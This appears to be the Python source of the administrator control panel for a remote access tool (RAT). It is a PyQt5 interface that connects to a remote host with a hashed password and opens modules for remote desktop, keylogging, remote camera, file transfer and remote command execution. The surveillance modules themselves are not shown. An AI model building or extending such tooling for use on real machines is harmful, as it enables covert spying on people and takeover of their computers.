import hashlib
import socket
import struct
from typing import Type

from PyQt5.QtCore import QThread, pyqtSignal
from PyQt5.QtGui import QIntValidator
from PyQt5.QtWidgets import QLabel, QWidget, QPushButton, QDialog, QVBoxLayout, QLineEdit, QHBoxLayout

from Constants import PACKET_SIZE
from RATConnection import RATClient
from RATFunction.FileTransferUI import FileTransferUI
from RATFunction.MessageUI import MessageUI
from RATFunction.RATFunction import Side
from RATFunction.RATFunctionRegistry import RATFunctionRegistry
from RATFunction.RATFunctionUI import RATFunctionUI
from RATFunction.RemoteCameraUI import RemoteCameraUI
from RATFunction.RemoteDesktopUI import RemoteDesktopUI
from RATFunction.MyLoggingUI import MyLoggingUI
from RATFunction.RemoveExecutionUI import RemoteExecutionUI


class AdminNetworkThread(QThread):
    received_packet = pyqtSignal(bytes)

    def __init__(self, client: RATClient, host, port, parent=None):
        super().__init__(parent)
        self.client = client
        self.host = host
        self.port = port

    def run(self):
        print("running network thread")
        self.client.packet_callback = self.handle_packet
        while True:
            try:
                print(f"attempting connection to ({self.host}, {self.port})")
                self.client.connect(self.host, self.port)
            except:
                return

    def handle_packet(self, data):
        self.received_packet.emit(data)


class AdministratorControlPanel(QWidget):

    def __init__(self, function_classes):
        super().__init__()
        self.setup_ui()
        self.client = RATClient()
        self.registry = RATFunctionRegistry()
        self.control_panel_elements = {}

        for function_class in function_classes:
            self.registry.add_function(function_class(Side.ADMIN_SIDE, self.client.packet_queue))

        self.add_control_panel_function('Send Message', 1, MessageUI)
        self.add_control_panel_function('Remote Desktop', 2, RemoteDesktopUI)
        self.add_control_panel_function('Keylogger', 3, MyLoggingUI)
        self.add_control_panel_function('Remote Camera', 4, RemoteCameraUI)
        self.add_control_panel_function('File Transfer', 5, FileTransferUI)
        self.add_control_panel_function('Remote Execution', 6, RemoteExecutionUI)

        self.reconnect()

    def setup_ui(self):
        self.setWindowTitle('Administrator Control Panel')
        self.setGeometry(100, 100, 400, 150)
        self.layout = QVBoxLayout()
        self.setLayout(self.layout)
        self.move(700, 400)

    def add_button(self, button):
        self.layout.addWidget(button)

    def setup_network_thread(self, host, port):
        # create a network thread and start it
        self.network_thread = AdminNetworkThread(self.client, host, port, parent=self)
        self.network_thread.received_packet.connect(self.gui_handle_packet)
        self.network_thread.finished.connect(self.reconnect)
        self.network_thread.start()

    def reconnect(self):
        dialog = QDialog(self)
        dialog.setWindowTitle('Connect')

        host_label = QLabel('Host:', dialog)
        host_input_field = QLineEdit(dialog)

        port_label = QLabel('Port:', dialog)
        port_input_field = QLineEdit(dialog)
        port_input_field.setText('8888')
        port_input_field.setValidator(QIntValidator())

        label = QLabel('Enter password:', dialog)
        input_field = QLineEdit(dialog)

        # Layout the label and text input field in the dialog
        layout = QVBoxLayout()
        layout.addWidget(host_label)
        layout.addWidget(host_input_field)
        layout.addWidget(port_label)
        layout.addWidget(port_input_field)
        layout.addWidget(label)
        layout.addWidget(input_field)
        dialog.setLayout(layout)

        # Add OK and Cancel buttons to the dialog
        ok_button = QPushButton('OK', dialog)
        ok_button.clicked.connect(dialog.accept)
        cancel_button = QPushButton('Cancel', dialog)
        cancel_button.clicked.connect(dialog.reject)
        layout.addWidget(ok_button)
        layout.addWidget(cancel_button)

        dialog.move(800, 400)
        dialog.setMinimumWidth(250)

        # Display the dialog and wait for user input
        if dialog.exec_() == QDialog.Accepted:
            # User clicked OK, get the user input and continue
            self.password = input_field.text()
            self.client.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.client.connected_callback = self.send_password

            host = host_input_field.text()
            if len(host) == 0:
                host = 'localhost'
            port = int(port_input_field.text())
            self.setup_network_thread(host, port)
        else:
            exit()

    def send_password(self):
        hash_object = hashlib.sha256()
        hash_object.update(self.password.encode())
        self.client.send_packet(struct.pack(f"I {PACKET_SIZE - 4}s", 0, hash_object.digest()))

    def gui_handle_packet(self, data):
        self.registry.route_packet(data)

    def add_control_panel_function(self, function_name: str, function_id: int, function_ui_class: Type[RATFunctionUI]):
        new_button = QPushButton(function_name, self)
        new_ui = function_ui_class(self.registry.get_function(function_id))
        new_button.clicked.connect(new_ui.show)
        self.add_button(new_button)
        self.control_panel_elements[function_id] = (new_button, new_ui)
